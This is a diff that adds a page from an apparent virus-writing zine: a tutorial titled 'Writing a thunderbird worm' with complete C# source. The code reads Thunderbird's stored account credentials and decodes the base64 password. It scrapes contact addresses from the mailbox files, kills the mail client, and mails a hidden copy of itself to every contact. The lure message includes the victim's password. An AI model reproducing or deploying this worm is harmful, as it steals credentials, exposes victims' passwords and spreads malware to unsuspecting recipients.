@@ -1,0 +1,367 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+    <br>
+	<div id="viewerText">
+		<div id="viewerTextHeader"><a href="#">Article: Writing a thunderbird worm</a></div>
+		<pre>
+<!--- put article/source here --->
+/****************************************************************
+ **** ThunderBird Worm               
+ **** by free0n 
+ **** free0n.host.sk - doomriderz.co.nr -DoomRiderz
+ ****************************************************************
+ ****/
+
+/****************************************************************
+ ************ Introduction
+ ****************************************************************
+ ****/
+
+Thunderbird is a pretty widley used email client for the desktop.
+It's run under mozillia. I use it and totally love the client.
+I'm only pointing this out because I  didn't like the low level 
+of security they put on these accounts by default and thought 
+it was shamefull. So to take advantage of this and not because 
+i'm evil. We will build a mass mailing worm and explain how to
+do it.
+
+One of the problems when building your mass spreading email worm
+is finding emails, servers whatever. Most mail servers now use 
+authentication (thanks to all the money grubbing spammers (die)). 
+So now I'll show you how easy it is to get the usernames, password, 
+mail server, users email address and a list of emails all from 
+thunderbird.
+
+Note: I'm using Thunderbird version is 1.5.0.9 (20061207) 
+	  on WinXP Pro.
+
+The language is in C# (my fav) but you can easily adapt it to
+any other language C/C++ hell whatever. The main point is showing how 
+anyways right? 
+
+
+/****************************************************************
+ ************ Where to go to find everything?
+ ****************************************************************
+ ****/
+
+
+Thunderbird by default will install and use the Application Data
+directory. This is not a bad place and lots of other apps use it
+also. The directory path should be like 
+
+C:\Documents and Settings\free0n\Application Data\Thunderbird
+
+The first file in the directory is a basic ini file named
+profiles.ini. When we open this up we will see profiles with a 
+variable called Path. Path will be equal to where it's storing 
+all it's email data.
+
+example:
+
+[General]
+StartWithLastProfile=1
+
+[Profile0]
+Name=default
+IsRelative=1
+Path=Profiles/dk03ltp3.default
+
+So based on the path variable we know where to go. The next step
+is get there. 
+
+C:\Documents and Settings\free0n\Application Data\Thunderbird\Profilesd\k03ltp3.default
+
+Now you should see a bunch of files, ini files, txt files and 
+folders. The first file we are interested in is signons.txt (maybe diffent). 
+This text file holds all our basic account info! like omg wtf were they 
+thinking! Open it in wordpad or something so you don't get square new lines.
+
+example:
+
+#2c
+.
+mailbox://free0n@mail.spoofed.com
+=username=
+~
+*=password=
+~ZG9vbXJpZGVyeg==
+.
+
+What can we tell with this? hmm the mailbox line has our username and the
+address of the mail server used. This is good so the next thing
+is our password. Guess what the password is encoded in! base64 hmm
+this is easy isn't it :)
+
+http://makcoder.sourceforge.net/demo/base64.php
+
+so now we have the username, mailserver, and the password
+which when decrypted is doomriderz. Lets get some emails to send
+to. You'll notice that the mailbox line listed the server
+for the account. This servername is also the name of the
+of the folder in the Mail directory.
+
+C:\Documents and Settings\free0n\Application Data\Thunderbird\Profiles\dk03ltp3.defaultMail
+
+Now there is 2 folders here. 1 called Local Folders and one called
+mail.spoofed.com. Now by default option Thunderbird will use the Local Folder
+to keep storage of emails unless the user changed it. But we can scan 
+both directories for emails it's no biggy.
+
+Lets use Local Folders first. You should notice a list of msf files along
+with a bunch of files with no extension. The ones with the pay
+dirt are the ones with no extension.
+
+Inbox         Inbox.msf
+Drafts        Drafts.msf
+Junk          Junk.msf
+Sent          Sent.msf
+Trash         Trash.msf
+
+So if you open up the Inbox or Sent files you should see all your
+emails in kind of a a plain text view. This is perfect for email
+scanning!
+
+So lets review,
+We have the username, the password, a mail server and a place
+to retrieve emails all from Thunderbird! Lets start coding.
+
+
+/****************************************************************
+ ************ ThunderBIRD 
+ ****************************************************************
+ ****/
+
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.IO;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Mime;
+using System.Net.Mail;
+using System.Windows.Forms;
+
+namespace Thunderbird {
+	class Program {
+		static string AppDataDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+		static string ThunderBirdDir = AppDataDir + @"Thunderbird";
+		static string profileIni = ThunderBirdDir + "profiles.ini";
+		static ArrayList arEmails = new ArrayList();
+		static string mserver = "";
+		static string username = "";
+		static string usersmail = "";
+		static string pass = "";
+
+		static void Main(string[] args) {
+			if (Directory.Exists(ThunderBirdDir)) {
+				//kill thunderbird if it's running
+				//they put a lock on their files whenlo
+				//thunderbird is open. So now we kill it
+
+				Process[] myProcesses;
+				myProcesses = Process.GetProcesses();
+				foreach (Process p in myProcesses) {
+					string Name = p.MainWindowTitle.ToLower();
+					if (Name.Contains("- thunderbird")) {
+						p.Kill();
+					}
+				}
+
+				//call Thunderbird to retrieve email
+				//info and send emails 
+				ThunderBird();
+
+			} else {
+				MessageBox.Show("Thunderbird not found! - Download at http://www.mozilla.org/download.html", "Thunderbird");                
+			}
+		}
+
+		static void ThunderBird() {
+		   
+			if (Directory.Exists(ThunderBirdDir)) {
+				ThunderBirdDir += ReadInI(profileIni);
+				string signonspath = ThunderBirdDir + @"signons.txt";
+				if (File.Exists(signonspath)) {
+					//parse the signons.txt file
+					//retrieve account settings
+					string s = "";
+					StreamReader sr = new StreamReader(signonspath);
+					while ((s = sr.ReadLine()) != null) {
+						if (s.Contains("mailbox://")) {
+							if (s.IndexOf("@") != -1) {
+								username = s.Substring(0, s.IndexOf("@")).Replace("mailbox://", "");
+								mserver = s.Substring(s.IndexOf("@") + 1);
+							}
+						}
+						if (s.Contains(@"*=password=")) {
+							pass = Base64Decode(sr.ReadLine().Substring(1));
+						}
+					}
+					sr.Close();
+					
+					//search for emails in the folders in mail directory
+					//we will only target the mail server folder and the
+					//local folder
+
+					SearchEmails(ThunderBirdDir + @"Mail" + mserver);
+					SearchEmails(ThunderBirdDir + @"MailLocal Folders");
+					string proc = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
+
+					//loop through all the emails we found
+					//then pass in the mail server, victims email and then
+					//the an email from the list
+
+					IEnumerator emailEnum = arEmails.GetEnumerator();
+					while (emailEnum.MoveNext()) {
+						if (emailEnum.Current.ToString() != usersmail) {
+							SendMail(mserver,  usersmail, emailEnum.Current.ToString());
+
+						}
+					}
+				}
+			}
+		}
+
+		static void SendMail(string server, string fromAddy, string toAddy) {
+
+			//create our new attachment based on the current 
+			//running processs this will end up being thunderbird.exe_ 
+			//we add the _ so mailservers don't block it.
+
+			string attachment = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName) + "_";
+			string strMsg = "Hey,n I found this really cool program that lets you read others people's email, it only works for thunderbird so you have ton" +
+							"download it at http://www.mozilla.com/en-US/thunderbird/ then once you install it just rename and run the thunderbird extension.n" +
+							"if you wanna try it on my account it'sn" +
+							"username: " + fromAddy + "n" +
+							"password: " + pass + "nn" +
+							"let me know if you can't get it to work or whatever.n" +
+							"byeeee! n ";
+
+
+			//copy the current file over to the new file
+			File.Copy(Convert.ToString(Process.GetCurrentProcess().MainModule.FileName), attachment, true);
+			File.SetAttributes(attachment, FileAttributes.Hidden);
+
+			if (File.Exists(attachment)) {
+				//now we attach the file and mail ourselves
+				//out to the contact
+				MailMessage message = new MailMessage(fromAddy, toAddy, "Hey", strMsg);
+
+				Attachment data = new Attachment(attachment);
+				message.Attachments.Add(data);
+
+				SmtpClient smtpClient = new SmtpClient(server);
+				smtpClient.Credentials = CredentialCache.DefaultNetworkCredentials;
+				smtpClient.Send(message);
+			}
+		}
+		
+		static string ReadInI(string path) {
+			string profileDir = "";
+			if (File.Exists(path)) {
+				StreamReader sr = new StreamReader(path);
+				string s = "";
+				while ((s = sr.ReadLine()) != null) {
+					if (s.Contains("Path=")) {
+						profileDir = s.Substring(5).Replace("/", @"");
+					}
+				}
+				sr.Close();
+			}
+			return profileDir;
+		}
+
+		static string Base64Decode(string p) {
+			byte[] passText = Convert.FromBase64String(p);
+			ASCIIEncoding ascii = new ASCIIEncoding();
+			return ascii.GetString(passText);
+		}
+
+		static void SearchEmails(string path) {
+			Console.WriteLine(path);
+			if (Directory.Exists(path)) {
+				string[] files = Directory.GetFiles(path);
+				for (int i = 0; i < files.Length; i++) {
+					StreamReader sr = File.OpenText(files[i]);
+					string input;
+					while ((input = sr.ReadLine()) != null) {
+						string email = ExtractAddr(input);
+						if (email != "") {
+							if (!arEmails.Contains(email)) {
+								//regex validation we revalidate our found emails again
+								//to make sure that what was returned was correct.
+								string strValGex = @"^([a-zA-Z0-9_-.]+)@(([[0-9]{1,3}" +
+												   @".[0-9]{1,3}.[0-9]{1,3}.)|(([a-zA-Z0-9-]+" +
+												   @".)+))([a-zA-Z]{2,4}|[0-9]{1,3})(]?)$";
+
+								Regex regVal = new Regex(strValGex);
+								//if match and doesn't exist yet in the arraylist add it.
+								if (regVal.IsMatch(email)) {
+									if (!arEmails.Contains(email)) {
+										if (email.Contains(username) && usersmail == "") {
+											usersmail = email;
+										}
+										Console.WriteLine("Email:" + email);
+										arEmails.Add(email);
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+
+		public static string ExtractAddr(string InputData) {
+			/*** genetix's email extractor thx u ;) ***/
+			string tmpExtractAddr = null;
+			int AtPos, p1, p2, n = 0;
+			string tmp = null;
+			AtPos = (InputData.IndexOf("@", 0) + 1);
+			p1 = 1;
+			p2 = InputData.Length;
+			tmpExtractAddr = "";
+			if (AtPos == 0)
+				return tmpExtractAddr;
+
+			for (n = (AtPos - 1); n >= 1; n--) {
+				tmp = InputData.Substring(n - 1, 1);
+				if ((tmp == " ") | (tmp == "<") | (tmp == "(") | (tmp == ":") | (tmp == ",") | (tmp == "[")) {
+					p1 = n + 1;
+					break;
+				}
+			}
+
+			for (n = (AtPos + 1); n <= InputData.Length; n++) {
+				tmp = InputData.Substring(n - 1, 1);
+				if ((tmp == " ") | (tmp == ">") | (tmp == ")") | (tmp == ":") | (tmp == ",") | (tmp == "]")) {
+					p2 = n - 1;
+					break;
+				}
+			}
+
+			//strip out any html and do some extra clean up
+			string email = InputData.Substring(p1 - 1, (p2 - p1) + 1);
+			email = Regex.Replace(email, @"<(.|n)*?>", string.Empty);
+			email = email.Replace("&nbsp;", "");
+			email = email.Replace(" ", "");
+			email = email.Replace(@"""", "");
+			return email;
+		}
+	}
+}
+
+
+		</pre>
+	</div>
+</body>
+</html>
